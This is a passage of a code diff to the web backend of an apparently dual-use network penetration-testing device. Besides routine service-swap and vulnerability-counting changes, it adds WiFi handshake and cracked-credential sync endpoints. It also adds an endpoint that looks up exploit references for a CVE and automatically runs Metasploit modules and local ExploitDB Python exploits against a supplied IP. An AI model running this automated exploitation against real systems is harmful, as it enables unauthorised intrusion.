@@ -14,6 +14,7 @@ import sys
 import json
 import csv
 import glob
+import uuid
 import signal
 import logging
 import threading
@@ -1376,20 +1377,37 @@ def _execute_pwn_mode_switch(target_mode: str) -> None:
         # "&& start pwnagotchi" tail would never execute.  systemd-run launches
         # the sequence in its own transient cgroup, fully outside ragnar.service,
         # so it survives ragnar's cgroup teardown.
+        # Build the swap + recovery bash script.
+        # Key design decisions:
+        # - bettercap start is attempted but NOT required (|| true) so a missing
+        #   bettercap installation never prevents pwnagotchi from starting.
+        # - After a 30-second settling window, we check if pwnagotchi is still
+        #   active. If it has crashed (common on first run / bad config), we
+        #   automatically restart Ragnar so the device doesn't go dark.
+        # - ragnar-swap-button.service is also optional (|| true).
+        swap_script = (
+            'systemctl stop ragnar.service'
+            ' && python3 -OO /home/ragnar/Ragnar/wipe_epd.py 2>/dev/null; true'
+            ' && systemctl start bettercap.service || true'
+            ' && systemctl start pwnagotchi.service'
+            ' && systemctl start ragnar-swap-button.service || true'
+            # Health check: wait 30 s then verify pwnagotchi is still active.
+            # If it crashed, restart Ragnar as a fallback.
+            ' && sleep 30'
+            ' && systemctl is-active --quiet pwnagotchi.service'
+            ' || ( journalctl -u pwnagotchi.service -n 20 --no-pager'
+            '      > /tmp/ragnar-pwn-crash.log 2>&1;'
+            '      systemctl start ragnar.service )'
+        )
         try:
             subprocess.Popen(
                 ['systemd-run', '--no-block', '--collect',
                  '--unit=ragnar-to-pwnagotchi-swap',
-                 'bash', '-c',
-                 'systemctl stop ragnar.service'
-                 ' && python3 -OO /home/ragnar/Ragnar/wipe_epd.py 2>/dev/null; true'
-                 ' && systemctl start bettercap.service'
-                 ' && systemctl start pwnagotchi.service'
-                 ' && systemctl start ragnar-swap-button.service'],
+                 'bash', '-c', swap_script],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
-            logger.info("Scheduled systemd-run swap: stop ragnar → start pwnagotchi")
+            logger.info("Scheduled systemd-run swap: stop ragnar → start pwnagotchi (with crash recovery)")
         except Exception as exc:
             logger.error(f"Failed to schedule pwnagotchi start sequence: {exc}")
         return
@@ -1562,126 +1580,41 @@ def is_orchestrator_running() -> bool:
 
 
 def sync_vulnerability_count():
-    """Synchronize vulnerability count across all data sources and network intelligence"""
+    """Synchronize vulnerability count from scan_findings (single source of truth)."""
     try:
         vuln_count = 0
-        vulnerable_hosts = set()
+        vulnerable_hosts: set = set()
 
-        def record_host(candidate):
-            """Normalize and record a host value for vulnerable host counting"""
-            if candidate is None:
-                return
+        # scan_findings is the canonical store — query it directly
+        try:
+            db = get_db()
+            with db.get_connection() as conn:
+                row = conn.execute(
+                    "SELECT COUNT(*) as cnt, COUNT(DISTINCT host) as hosts FROM scan_findings"
+                ).fetchone()
+                if row:
+                    vuln_count = row['cnt'] or 0
+                    host_count = row['hosts'] or 0
+                # Collect distinct hosts for vulnerable_host_count
+                for r in conn.execute("SELECT DISTINCT host FROM scan_findings WHERE host IS NOT NULL AND host != ''"):
+                    vulnerable_hosts.add(r['host'])
+        except Exception as db_err:
+            logger.debug(f"scan_findings query failed, falling back to network intelligence: {db_err}")
+            # Fallback: read from network intelligence if DB unavailable
+            if (hasattr(shared_data, 'network_intelligence') and shared_data.network_intelligence):
+                findings = shared_data.network_intelligence.get_active_findings_for_dashboard()
+                vuln_count = findings['counts']['vulnerabilities']
+                for v in findings.get('vulnerabilities', {}).values():
+                    h = v.get('host') or v.get('ip') or ''
+                    if h and h.lower() not in {'unknown', 'none', 'n/a', 'na'}:
+                        vulnerable_hosts.add(h)
 
-            if isinstance(candidate, (list, tuple, set)):
-                for item in candidate:
-                    record_host(item)
-                return
-
-            host_value = str(candidate).strip()
-            if not host_value:
-                return
-
-            lowered = host_value.lower()
-            if lowered in {'unknown', 'none', 'n/a', 'na', 'null'}:
-                return
-
-            vulnerable_hosts.add(host_value)
-
-        # Check if network intelligence is enabled
-        if (hasattr(shared_data, 'network_intelligence') and
-            shared_data.network_intelligence and
-            shared_data.config.get('network_intelligence_enabled', True)):
-
-            # Update network context first
-            shared_data.network_intelligence.update_network_context()
-
-            # Get active findings count for current network
-            dashboard_findings = shared_data.network_intelligence.get_active_findings_for_dashboard()
-            vuln_count = dashboard_findings['counts']['vulnerabilities']
-
-            for vuln_info in dashboard_findings.get('vulnerabilities', {}).values():
-                if isinstance(vuln_info, dict):
-                    record_host(
-                        vuln_info.get('host') or
-                        vuln_info.get('ip') or
-                        vuln_info.get('target') or
-                        vuln_info.get('hostname')
-                    )
-
-            logger.debug(f"Network intelligence vulnerability count: {vuln_count}")
-        else:
-            # Fallback to legacy file-based counting
-            vuln_results_dir = getattr(shared_data, 'vulnerabilities_dir', os.path.join('data', 'output', 'vulnerabilities'))
-            
-            logger.debug(f"Syncing vulnerabilities from directory: {vuln_results_dir}")
-            
-            # Create directory if it doesn't exist
-            try:
-                os.makedirs(vuln_results_dir, exist_ok=True)
-                logger.debug(f"Ensured directory exists: {vuln_results_dir}")
-            except Exception as e:
-                logger.warning(f"Could not create vulnerabilities directory: {e}")
-            
-            if os.path.exists(vuln_results_dir):
-                try:
-                    files_found = []
-                    for filename in os.listdir(vuln_results_dir):
-                        if filename.endswith('.txt') and not filename.startswith('.'):
-                            files_found.append(filename)
-                            filepath = os.path.join(vuln_results_dir, filename)
-                            try:
-                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                                    content = f.read()
-                                    if content.strip():
-                                        # Count CVEs or files with vulnerability content
-                                        cve_matches = re.findall(r'CVE-\d{4}-\d+', content)
-                                        if cve_matches:
-                                            vuln_count += len(cve_matches)
-                                            logger.debug(f"Found {len(cve_matches)} CVEs in {filename}: {cve_matches}")
-                                        elif len(content.strip()) > 50:  # File has significant content
-                                            vuln_count += 1
-                                            logger.debug(f"Found vulnerability content in {filename} (no CVEs)")
-                            except Exception as e:
-                                logger.debug(f"Could not read vulnerability file {filepath}: {e}")
-                                continue
-
-                    logger.debug(f"Vulnerability files found: {files_found}")
-                    logger.debug(f"Total vulnerability count calculated: {vuln_count}")
-                except Exception as e:
-                    logger.warning(f"Could not list vulnerabilities directory: {e}")
-            else:
-                logger.warning(f"Vulnerabilities directory does not exist: {vuln_results_dir}")
-
-            vuln_summary_file = getattr(shared_data, 'vuln_summary_file',
-                                        os.path.join('data', 'output', 'vulnerabilities', 'vulnerability_summary.csv'))
-
-            if os.path.exists(vuln_summary_file):
-                try:
-                    if pandas_available:
-                        df = pd.read_csv(vuln_summary_file)
-                        if not df.empty:
-                            for _, row in df.iterrows():
-                                vulnerabilities = safe_str(row.get('Vulnerabilities')).strip()
-                                if vulnerabilities and vulnerabilities.lower() not in {'none', 'nan', 'na', '0'}:
-                                    record_host(row.get('IP') or row.get('Hostname'))
-                    else:
-                        with open(vuln_summary_file, 'r', encoding='utf-8', errors='ignore') as summary_file:
-                            reader = csv.DictReader(summary_file)
-                            for row in reader:
-                                vulnerabilities = (row.get('Vulnerabilities') or '').strip()
-                                if vulnerabilities and vulnerabilities.lower() not in {'none', 'nan', 'na', '0'}:
-                                    record_host(row.get('IP') or row.get('Hostname'))
-                except Exception as e:
-                    logger.debug(f"Could not parse vulnerability summary for host count: {e}")
-
-        # Update shared data with synchronized count
         old_count = shared_data.vulnnbr
         shared_data.vulnnbr = vuln_count
-        logger.debug(f"Updated shared_data.vulnnbr: {old_count} -> {vuln_count}")
+        shared_data.vulnerable_host_count = len(vulnerable_hosts)
+        logger.debug(f"vuln count: {old_count} -> {vuln_count} ({len(vulnerable_hosts)} hosts)")
 
-        # ── Pushover: new vulnerability notification ──
-        # Always pass the absolute total; PushoverService tracks its own baseline
-        # (loaded from DB at startup) to avoid re-alerting on restart.
+        # Pushover notification
         try:
             from pushover_service import PushoverService
             _po = getattr(shared_data, '_pushover_service', None)
@@ -1692,14 +1625,8 @@ def sync_vulnerability_count():
         except Exception as _po_err:
             logger.debug(f"Pushover vulnerability notification skipped: {_po_err}")
 
-        old_host_count = getattr(shared_data, 'vulnerable_host_count', 0)
-        shared_data.vulnerable_host_count = len(vulnerable_hosts)
-        logger.debug(f"Updated vulnerable host count: {old_host_count} -> {shared_data.vulnerable_host_count}")
-
-        # SQLite is the primary source of truth - CSV livestatus file is deprecated
-        logger.debug(f"Synchronized vulnerability count: {vuln_count}")
         return vuln_count
-        
+
     except Exception as e:
         logger.error(f"Error synchronizing vulnerability count: {e}")
         return safe_int(shared_data.vulnnbr)
@@ -2087,8 +2014,20 @@ def _count_files_in_tree(directory: Optional[str]) -> int:
 
 
 def _load_intelligence_vulnerability_counts(intelligence_dir: Optional[str]) -> Tuple[Optional[int], Optional[int]]:
-    # Prefer live, in-memory data from the intelligence engine when available so
-    # dashboard cards stay aligned with the Threat Intel tab.
+    # scan_findings is the canonical store (written by every scanner run).
+    # Query it first so this matches sync_vulnerability_count() exactly.
+    try:
+        _db = get_db()
+        with _db.get_connection() as _conn:
+            row = _conn.execute(
+                "SELECT COUNT(*) as cnt, COUNT(DISTINCT host) as hosts FROM scan_findings"
+            ).fetchone()
+            if row and (row['cnt'] or 0) > 0:
+                return safe_int(row['cnt'], 0), safe_int(row['hosts'], 0)
+    except Exception as _e:
+        logger.debug(f"scan_findings count in _load_intelligence_vulnerability_counts: {_e}")
+
+    # Fallback: live network intelligence (may include stale pre-filter data)
     try:
         network_intel = getattr(shared_data, 'network_intelligence', None)
         intel_enabled = getattr(shared_data, 'config', {}).get('network_intelligence_enabled', True)
@@ -4406,6 +4345,20 @@ def get_network_topology():
             # ----------------------------------------------------------
             # Phase 1: fast rule-based classification (no AI calls)
             # ----------------------------------------------------------
+            # Collect all local IPs (Ragnar can be on WiFi + Ethernet simultaneously)
+            ragnar_ips: set = set()
+            try:
+                import netifaces as _nif
+                for _iface in _nif.interfaces():
+                    for _addr in _nif.ifaddresses(_iface).get(_nif.AF_INET, []):
+                        _a = _addr.get('addr', '')
+                        if _a and not _a.startswith('127.') and not _a.startswith('169.254.'):
+                            ragnar_ips.add(_a)
+            except Exception:
+                pass
+            if ragnar_ip:
+                ragnar_ips.add(ragnar_ip)
+
             nodes = []
             node_ids = set()
             low_confidence_indices = []  # indices of nodes needing AI help
@@ -4451,7 +4404,7 @@ def get_network_topology():
                     'risk': risk,
                     'last_seen': host.get('last_seen', ''),
                     'is_gateway': ip == gateway_ip,
-                    'is_ragnar': ip == ragnar_ip,
+                    'is_ragnar': ip in ragnar_ips,
                 }
                 nodes.append(node)
                 node_ids.add(ip)
@@ -8921,6 +8874,73 @@ def save_pwnagotchi_config():
         return jsonify({'success': False, 'error': str(e)}), 500
 
 
+@app.route('/api/pwnagotchi/peer-sync', methods=['POST'])
+def pwnagotchi_peer_sync():
+    """Manually trigger a handshake sync from a configured Pwnagotchi peer."""
+    try:
+        from actions.pwnagotchi_sync import _Syncer
+        import csv as _csv
+
+        cfg = shared_data.config
+        if not cfg.get('pwnagotchi_peer_enabled', False):
+            return jsonify({'success': False, 'error': 'Peer sync is not enabled'}), 400
+
+        peer_ip = cfg.get('pwnagotchi_peer_ip', '').strip()
+        if not peer_ip:
+            return jsonify({'success': False, 'error': 'No peer IP configured'}), 400
+
+        syncer = _Syncer(shared_data)
+        syncer.run()
+
+        # Count cracked entries
+        cracked_count = 0
+        if os.path.exists(shared_data.wififile):
+            with open(shared_data.wififile, newline='') as f:
+                cracked_count = sum(1 for _ in _csv.DictReader(f))
+
+        shared_data.config['pwnagotchi_peer_last_sync'] = datetime.now().isoformat()
+        shared_data.config['pwnagotchi_peer_cracked_total'] = cracked_count
+        shared_data.save_config()
+
+        return jsonify({
+            'success': True,
+            'cracked_total': cracked_count,
+            'last_sync': shared_data.config['pwnagotchi_peer_last_sync'],
+        })
+    except Exception as exc:
+        logger.error(f'Pwnagotchi peer sync error: {exc}')
+        return jsonify({'success': False, 'error': str(exc)}), 500
+
+
+@app.route('/api/pwnagotchi/peer-status')
+def pwnagotchi_peer_status():
+    """Return current peer sync status and cracked WiFi credential count."""
+    cfg = shared_data.config
+    cracked_count = 0
+    if os.path.exists(getattr(shared_data, 'wififile', '')):
+        try:
+            import csv as _csv
+            with open(shared_data.wififile, newline='') as f:
+                cracked_count = sum(1 for _ in _csv.DictReader(f))
+        except Exception:
+            pass
+
+    # Count handshake files in the local dir
+    import glob as _glob
+    handshake_count = len([
+        p for p in _glob.glob('/root/handshakes/*')
+        if any(p.lower().endswith(ext) for ext in ('.pcap', '.pcapng', '.22000', '.hc22000'))
+    ])
+
+    return jsonify({
+        'enabled': cfg.get('pwnagotchi_peer_enabled', False),
+        'peer_ip': cfg.get('pwnagotchi_peer_ip', ''),
+        'last_sync': cfg.get('pwnagotchi_peer_last_sync', ''),
+        'cracked_total': cracked_count,
+        'handshake_count': handshake_count,
+    })
+
+
 def _set_toml_value(doc, dotted_key, value):
     """Set a nested value in a tomlkit document using dotted key notation."""
     import tomlkit
@@ -9311,13 +9331,26 @@ def reset_vulnerabilities():
         if os.path.exists(scanned_ports_history_file):
             try:
                 os.remove(scanned_ports_history_file)
-                logger.info("✅ Cleared scan history cache - all hosts will be rescanned on next vulnerability scan")
+                logger.info("Cleared scan history cache - all hosts will be rescanned on next vulnerability scan")
             except Exception as e:
                 logger.error(f"Error clearing scan history cache: {e}")
-        
+
+        # Clear scan_findings SQLite table (primary persistent store for all vuln findings)
+        try:
+            db = get_db()
+            with db.get_connection() as conn:
+                c = conn.execute("DELETE FROM scan_findings")
+                sf_deleted = c.rowcount
+                conn.execute("UPDATE hosts SET vulnerabilities = ''")
+                conn.commit()
+            logger.info(f"Cleared {sf_deleted} rows from scan_findings and reset host vulnerability columns")
+            deleted_count += sf_deleted
+        except Exception as e:
+            logger.error(f"Error clearing scan_findings from database: {e}")
+
         # Reset vulnerability counter
         shared_data.vulnnbr = 0
-        
+
         # Trigger sync
         sync_vulnerability_count()
         
@@ -10760,6 +10793,35 @@ def get_epaper_display():
         
     except Exception as e:
         logger.error(f"Error getting e-paper display: {e}")
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/display/diagnose')
+def display_diagnose():
+    """Return current display configuration and hardware status for debugging."""
+    try:
+        epd_type = shared_data.config.get('epd_type', 'unknown')
+        epd_helper = getattr(shared_data, 'epd_helper', None)
+        info = {
+            'epd_type_config': epd_type,
+            'epd_helper_active': epd_helper is not None,
+            'width': getattr(shared_data, 'width', None),
+            'height': getattr(shared_data, 'height', None),
+            'ref_width': shared_data.config.get('ref_width'),
+            'ref_height': shared_data.config.get('ref_height'),
+            'screen_reversed': getattr(shared_data, 'screen_reversed', 0),
+            'web_screen_reversed': getattr(shared_data, 'web_screen_reversed', 0),
+        }
+        if epd_helper is not None:
+            info['epd_driver_width'] = getattr(epd_helper.epd, 'width', None)
+            info['epd_driver_height'] = getattr(epd_helper.epd, 'height', None)
+        screen_png = os.path.join(shared_data.webdir, 'screen.png')
+        info['screen_png_exists'] = os.path.exists(screen_png)
+        if info['screen_png_exists']:
+            info['screen_png_mtime'] = int(os.path.getmtime(screen_png))
+        return jsonify(info)
+    except Exception as e:
+        logger.error(f"Error in display diagnose: {e}")
         return jsonify({'error': str(e)}), 500
 
 
@@ -13084,12 +13146,59 @@ def _collect_manual_targets():
                         ports = [p.strip() for p in ports_str.split(';') if p.strip()]
                 
                 if ip and ip not in target_ips:
+                    # Load vulnerability data per port — scan_findings first, then network_intelligence
+                    vuln_by_port: dict = {}
+                    try:
+                        with db.get_connection() as _vc:
+                            vrows = _vc.execute(
+                                "SELECT port, title, description, severity, cvss_score "
+                                "FROM scan_findings WHERE host=? AND port IS NOT NULL",
+                                (ip,)
+                            ).fetchall()
+                            for vr in vrows:
+                                pk = str(vr['port'])
+                                vuln_by_port.setdefault(pk, []).append({
+                                    'cve': vr['title'] or '',
+                                    'title': vr['description'] or vr['title'] or '',
+                                    'cvss': vr['cvss_score'],
+                                    'severity': vr['severity'] or 'unknown',
+                                })
+                    except Exception:
+                        pass
+                    # Also merge in-memory network_intelligence (catches pre-SQL-mirror scans)
+                    try:
+                        import re as _re2
+                        _ni = shared_data.network_intelligence
+                        if _ni and hasattr(_ni, 'active_vulnerabilities'):
+                            for _nv in _ni.active_vulnerabilities.values():
+                                for _vd in _nv.values():
+                                    if _vd.get('host') != ip:
+                                        continue
+                                    _vport = str(_vd.get('port', ''))
+                                    _vtxt = _vd.get('vulnerability', '')
+                                    _vsev = _vd.get('severity', 'unknown')
+                                    _cm = _re2.search(r'(CVE-\d{4}-\d+)', _vtxt)
+                                    _sm = _re2.search(r'Score:\s*(\d{1,2}\.\d)', _vtxt)
+                                    _cve_id = _cm.group(1) if _cm else None
+                                    _cvss = float(_sm.group(1)) if _sm else None
+                                    if _cve_id and _vport:
+                                        _existing = vuln_by_port.get(_vport, [])
+                                        if not any(e['cve'] == _cve_id for e in _existing):
+                                            vuln_by_port.setdefault(_vport, []).append({
+                                                'cve': _cve_id,
+                                                'title': _vtxt,
+                                                'cvss': _cvss,
+                                                'severity': _vsev,
+                                            })
+                    except Exception:
+                        pass
                     targets.append({
                         'ip': ip,
                         'hostname': hostname,
                         'ports': ports,
                         'mac': host.get('mac', '00:00:00:00:00:00'),
-                        'source': 'Database'
+                        'source': 'Database',
+                        'vuln_by_port': vuln_by_port,
                     })
                     target_ips.add(ip)
         
@@ -13401,12 +13510,365 @@ def execute_manual_attack():
             'success': True,
             'message': f'Manual {attack_type} attack initiated on {target_ip}' + (f':{target_port}' if target_port else '')
         })
-        
+
     except Exception as e:
         logger.error(f"Error executing manual attack: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
 
-@app.route('/api/automation/orchestrator/start', methods=['POST'])
+
+@app.route('/api/manual/execute-exploit', methods=['POST'])
+def execute_cve_exploit():
+    """Attempt to exploit a specific CVE using Metasploit / searchsploit / ExploitDB"""
+    try:
+        data = request.get_json()
+        target_ip = (data.get('ip') or '').strip()
+        target_port = str(data.get('port') or '').strip()
+        cve = (data.get('cve') or '').strip().upper()
+
+        if not target_ip or not cve:
+            return jsonify({'success': False, 'error': 'Missing ip or cve'}), 400
+        if not cve.startswith('CVE-'):
+            return jsonify({'success': False, 'error': 'Invalid CVE identifier'}), 400
+
+        def _run_exploit():
+            import shutil, subprocess, json as _json, re as _re2, glob as _glob
+
+            def emit(msg, status='info', stage='running'):
+                _emit_manual_attack_update(cve, target_ip, target_port, stage, msg, status)
+
+            emit(f'Starting exploitation: {cve} on {target_ip}:{target_port}', 'warning')
+            shared_data.ragnarstatustext = 'CVEExploit'
+            shared_data.ragnarstatustext2 = f'{cve} → {target_ip}'
+            broadcast_status_update()
+
+            cve_num = cve.replace('CVE-', '')   # e.g. "2023-38408" for MSF search
+
+            session_opened = False
+            tried_any = False
+
+            # Collected exploit references across all sources
+            raw_edb_ids: list = []      # from vulners.nse raw scan output
+            raw_github_urls: list = []  # from vulners.nse raw scan output
+            nvd_edb_ids: list = []      # from NVD API
+            nvd_poc_urls: list = []     # from NVD API
+            service_name = ''
+            service_version = ''
+            service_ver_short = ''      # e.g. "8.9" for searchsploit
+
+            # ── Step 1: Read raw nmap scan file ────────────────────────────
+            # The raw file has unfiltered vulners.nse output: every *EXPLOIT*
+            # tagged EDB-ID and GitHub PoC that the parser dropped.
+            vuln_dir = getattr(shared_data, 'vulnerabilities_dir',
+                               os.path.join('data', 'output', 'vulnerabilities'))
+            try:
+                scan_files = _glob.glob(os.path.join(vuln_dir, f'*_{target_ip}_vuln_scan.txt'))
+                if scan_files:
+                    with open(scan_files[0]) as _sf:
+                        raw_content = _sf.read()
+
+                    # Extract service + version from the port/tcp line
+                    # e.g. "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3"
+                    pm = _re2.search(
+                        rf'^{_re2.escape(target_port)}/tcp\s+\S+\s+(\S+)\s*(.*?)$',
+                        raw_content, _re2.MULTILINE
+                    )
+                    if pm:
+                        service_name = pm.group(1).strip()
+                        service_version = pm.group(2).strip()
+                        ver_m = _re2.match(r'(\d+\.\d+)', service_version)
+                        service_ver_short = ver_m.group(1) if ver_m else ''
+                        emit(f'Service: {service_name} {service_version}')
+
+                    # Walk line by line, track which port section we're in,
+                    # and collect *EXPLOIT*-tagged lines.
+                    in_port_block = False
+                    for line in raw_content.split('\n'):
+                        stripped = line.strip().lstrip('|').strip()
+                        if _re2.match(rf'^{_re2.escape(target_port)}/tcp', line):
+                            in_port_block = True
+                        elif _re2.match(r'^\d+/tcp', line):
+                            in_port_block = False
+                        if not in_port_block:
+                            continue
+
+                        is_exploit_line = '*EXPLOIT*' in stripped.upper()
+
+                        # EDB-ID references (e.g. "EDB-ID:51960  9.8  <url>  *EXPLOIT*")
+                        edb_m = _re2.search(r'EDB-ID:(\d+)', stripped)
+                        if edb_m and is_exploit_line:
+                            eid = edb_m.group(1)
+                            if eid not in raw_edb_ids:
+                                raw_edb_ids.append(eid)
+
+                        # GitHub PoC URLs from vulners
+                        for gh in _re2.findall(r'https://github\.com/\S+', stripped):
+                            gh = gh.rstrip(')')
+                            if is_exploit_line and gh not in raw_github_urls:
+                                raw_github_urls.append(gh)
+
+                        # vulners.com/githubexploit/ links
+                        for vg in _re2.findall(r'https://vulners\.com/githubexploit/\S+', stripped):
+                            vg = vg.rstrip(')')
+                            if vg not in raw_github_urls:
+                                raw_github_urls.append(vg)
+
+                    if raw_edb_ids:
+                        emit(f'vulners.nse ExploitDB refs: {", ".join(f"EDB-{e}" for e in raw_edb_ids)}')
+                    if raw_github_urls:
+                        emit(f'vulners.nse found {len(raw_github_urls)} exploit/PoC references (resolving...)')
+                else:
+                    emit('Raw nmap scan file not found — run a vuln scan first for best results', 'warning')
+            except Exception as raw_err:
+                emit(f'Raw scan read error: {raw_err}', 'warning')
+
+            # ── Step 1.5: Resolve vulners.com/githubexploit/ → GitHub URLs ─
+            # Use the Vulners search API to bulk-query all UUIDs in one call
+            # rather than one HTTP request per UUID (which is slow and gets blocked).
+            resolved_urls: dict = {}   # orig_vulners_url -> (github_href, title)
+            try:
+                import requests as _req2
+                uuid_map: dict = {}   # uuid -> orig_url
+                for u in raw_github_urls:
+                    m = _re2.search(r'/githubexploit/([A-F0-9a-f0-9-]{36})', u, _re2.I)
+                    if m:
+                        uuid_map[m.group(1).upper()] = u
+
+                if uuid_map:
+                    emit(f'Querying Vulners API to resolve {len(uuid_map)} PoC UUID(s)...')
+                    # Bulk ID lookup endpoint
+                    bulk_r = _req2.post(
+                        'https://vulners.com/api/v3/search/id/',
+                        json={'id': list(uuid_map.keys())[:20]},
+                        timeout=10,
+                        headers={'User-Agent': 'Ragnar-Security-Scanner/1.0',
+                                 'Content-Type': 'application/json'}
+                    )
+                    if bulk_r.status_code == 200:
+                        docs = bulk_r.json().get('data', {}).get('documents', {})
+                        for uid, doc in docs.items():
+                            href = doc.get('href', '')
+                            title = doc.get('title', '')
+                            orig = uuid_map.get(uid.upper(), '')
+                            if href and orig:
+                                resolved_urls[orig] = (href, title)
+
+                    if resolved_urls:
+                        emit(f'Resolved {len(resolved_urls)} → actual GitHub repos:')
+                        for orig, (href, title) in list(resolved_urls.items())[:12]:
+                            label = f' — {title[:80]}' if title else ''
+                            emit(f'  GitHub: {href}{label}')
+                    else:
+                        emit('Vulners API returned no resolved URLs (may require API key)', 'warning')
+            except Exception as resolve_err:
+                emit(f'Vulners URL resolution skipped: {resolve_err}', 'warning')
+
+            # ── Step 2: NVD API — additional exploit references ────────────
+            try:
+                import requests as _req
+                emit(f'Querying NVD for {cve} references...')
+                nvd_resp = _req.get(
+                    f'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}',
+                    timeout=8, headers={'User-Agent': 'Ragnar-Security-Scanner/1.0'}
+                )
+                if nvd_resp.status_code == 200:
+                    entries = nvd_resp.json().get('vulnerabilities', [])
+                    if entries:
+                        for ref in entries[0].get('cve', {}).get('references', []):
+                            ref_url = ref.get('url', '')
+                            ref_tags = ref.get('tags', [])
+                            if 'exploit-db.com/exploits/' in ref_url:
+                                eid = ref_url.split('/exploits/')[-1].strip('/')
+                                if eid and eid not in raw_edb_ids and eid not in nvd_edb_ids:
+                                    nvd_edb_ids.append(eid)
+                                    emit(f'NVD ExploitDB ref: EDB-{eid}  →  {ref_url}')
+                            elif ('Exploit' in ref_tags) and ('github.com' in ref_url or 'poc' in ref_url.lower()):
+                                if ref_url not in raw_github_urls and ref_url not in nvd_poc_urls:
+                                    nvd_poc_urls.append(ref_url)
+                                    emit(f'NVD PoC: {ref_url}')
+                    if not nvd_edb_ids and not nvd_poc_urls:
+                        emit('NVD: no additional exploit references')
+            except Exception as nvd_err:
+                emit(f'NVD lookup skipped: {nvd_err}', 'warning')
+
+            all_edb_ids = list(dict.fromkeys(raw_edb_ids + nvd_edb_ids))
+
+            # ── Step 3: Metasploit ─────────────────────────────────────────
+            # Metasploit indexes by product/service name, NOT by CVE number.
+            # Primary search: service name (e.g. 'openssh').
+            # Fallback: free-text CVE ID search (works only if module is tagged).
+            msf = shutil.which('msfconsole')
+            if msf:
+                tried_any = True
+                msf_modules: list = []
+
+                # Build search terms from what we know about the service
+                msf_search_terms: list = []
+                if service_name:
+                    msf_search_terms.append(f'{service_name} type:exploit')
+                    if service_ver_short:
+                        msf_search_terms.append(f'{service_name} {service_ver_short} type:exploit')
+                # CVE fallback — last resort
+                msf_search_terms.append(cve_num)
+
+                for term in msf_search_terms:
+                    if msf_modules:
+                        break
+                    emit(f'Metasploit: search {term}')
+                    try:
+                        s_out = subprocess.run(
+                            [msf, '-q', '--no-readline', '-x', f'search {term}; exit'],
+                            capture_output=True, text=True, timeout=90
+                        )
+                        msf_modules = _re2.findall(r'\s+(exploit/\S+)\s', s_out.stdout + s_out.stderr)
+                    except subprocess.TimeoutExpired:
+                        emit('Metasploit search timed out', 'warning')
+                        break
+                    except Exception as msf_err:
+                        emit(f'Metasploit error: {msf_err}', 'warning')
+                        break
+
+                if msf_modules:
+                    # Filter to modules whose path actually contains the service name.
+                    # e.g. search 'ssh type:exploit' returns 49 modules including Cisco,
+                    # Acronis etc. — keep only those with /ssh/ in their module path.
+                    svc_key = service_name.lower()
+                    filtered = [m for m in msf_modules if svc_key in m.lower().split('/')]
+                    if not filtered:
+                        # Broader filter: service name appears anywhere in path
+                        filtered = [m for m in msf_modules if svc_key in m.lower()]
+                    if not filtered:
+                        filtered = msf_modules  # fallback: use all results
+
+                    emit(f'Found {len(msf_modules)} module(s), {len(filtered)} match service ({service_name}):')
+                    for m in filtered[:8]:
+                        emit(f'  {m}')
+                    mod = filtered[0]
+                    emit(f'Running: {mod} against {target_ip}:{target_port}', 'warning')
+                    try:
+                        cmds = (f'use {mod};set RHOSTS {target_ip};set RPORT {target_port or 0};'
+                                f'set ConnectTimeout 10;run -z;exit')
+                        run_out = subprocess.run(
+                            [msf, '-q', '--no-readline', '-x', cmds],
+                            capture_output=True, text=True, timeout=180
+                        )
+                        out = run_out.stdout + run_out.stderr
+                        for line in out.split('\n'):
+                            line = line.strip()
+                            if not line or line.startswith('msf') or 'exec:' in line:
+                                continue
+                            lvl = 'success' if any(k in line.lower() for k in ('session', 'meterpreter', 'shell opened')) else 'info'
+                            emit(line, lvl)
+                        session_opened = bool(_re2.search(
+                            r'(session \d+ opened|Meterpreter session|command shell session)', out, _re2.I))
+                    except subprocess.TimeoutExpired:
+                        emit('Metasploit exploit timed out', 'warning')
+                    except Exception as run_err:
+                        emit(f'Metasploit run error: {run_err}', 'warning')
+                else:
+                    emit('No Metasploit modules found for this service', 'warning')
+
+            # ── Step 4: searchsploit / local ExploitDB ─────────────────────
+            if not session_opened:
+                ss = shutil.which('searchsploit')
+                if ss:
+                    tried_any = True
+                    found_paths: list = []
+
+                    # 4a. Look up every EDB-ID we collected (most precise)
+                    for eid in all_edb_ids:
+                        emit(f'Looking up local ExploitDB EDB-{eid}...')
+                        try:
+                            p_out = subprocess.run([ss, '-p', eid], capture_output=True, text=True, timeout=15)
+                            pm = _re2.search(r'Path\s*:\s*(.+)', p_out.stdout)
+                            if pm:
+                                p = pm.group(1).strip()
+                                if os.path.exists(p) and p not in found_paths:
+                                    found_paths.append(p)
+                                    emit(f'  Found: {p}')
+                        except Exception:
+                            pass
+
+                    # 4b. Search by service name + version (correct searchsploit method)
+                    if service_name and service_ver_short and not found_paths:
+                        term = f'{service_name} {service_ver_short}'
+                        emit(f'Searching ExploitDB by service: {term}')
+                        try:
+                            ss_out = subprocess.run(
+                                [ss, '--json', service_name, service_ver_short],
+                                capture_output=True, text=True, timeout=30
+                            )
+                            ss_data = _json.loads(ss_out.stdout or '{}')
+                            exploits = ss_data.get('RESULTS_EXPLOIT', [])
+                            if exploits:
+                                emit(f'  {len(exploits)} result(s) for {term}:')
+                                for ex in exploits[:6]:
+                                    emit(f'  [{ex.get("EDB-ID","?")}] {ex.get("Title","?")}')
+                                    p = ex.get('Path', '')
+                                    if p and os.path.exists(p) and p not in found_paths:
+                                        found_paths.append(p)
+                            else:
+                                emit(f'  No local entries for {term}', 'warning')
+                        except Exception:
+                            pass
+
+                    # 4c. Attempt to run Python exploits found locally
+                    for expath in found_paths:
+                        if expath.endswith('.py'):
+                            emit(f'Running: python3 {os.path.basename(expath)} {target_ip} {target_port}', 'warning')
+                            try:
+                                py_out = subprocess.run(
+                                    ['python3', expath, target_ip, target_port],
+                                    capture_output=True, text=True, timeout=30
+                                )
+                                for line in (py_out.stdout + py_out.stderr).split('\n'):
+                                    if line.strip():
+                                        emit(line.strip())
+                            except Exception as py_err:
+                                emit(f'Python exploit error: {py_err}', 'warning')
+                        else:
+                            emit(f'Non-Python exploit — run manually: {expath}')
+
+                    if not found_paths and not all_edb_ids:
+                        emit('No local ExploitDB entries found', 'warning')
+
+            # ── Step 5: Surface all PoC URLs for manual use ────────────────
